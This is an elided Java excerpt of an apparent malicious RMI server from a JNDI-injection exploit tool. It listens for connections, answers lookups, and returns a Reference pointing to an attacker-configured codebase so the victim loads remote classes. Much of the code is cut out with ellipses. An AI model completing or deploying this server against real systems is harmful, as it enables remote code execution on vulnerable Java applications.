...
public class RMIServer implements Runnable {
    ...
    @Override
    public void run() {
        System.out.println("[*] [RMI-Server]  Start Listening on " + this.ip + ":" + this.port);
        try {
            Socket s = null;
            try {
                while (!this.exit && (s = this.ss.accept()) != null) {
                    try {
                        ...
                        System.out.println("-----------------------------------------");
                        System.out.println("[+] [RMI-Server] Have connection from " + remote);
...
//        System.out.println("[RMI] Is RMI.lookup call for " + object + " " + method);
        ...
        try (ObjectOutputStream oos = new MarshalOutputStream(out, JndiConfig.codebase)) {
            ...
            if (result instanceof Reference) {
                ...
                Reference ref = new Reference("foo", (String) result, JndiConfig.codebase);
